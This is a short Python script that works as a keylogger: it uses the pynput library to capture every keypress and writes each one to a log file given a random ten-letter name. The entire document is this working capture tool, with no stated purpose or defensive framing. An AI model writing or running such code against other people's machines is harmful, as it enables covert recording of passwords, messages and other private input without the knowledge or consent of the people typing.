from pynput.keyboard import Key, Listener
import logging, random, string

# randomly name the output file 
log = "".join(random.choice(string.ascii_letters) for _ in range(10)) + ".txt"

logging.basicConfig(filename=("" + log), level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()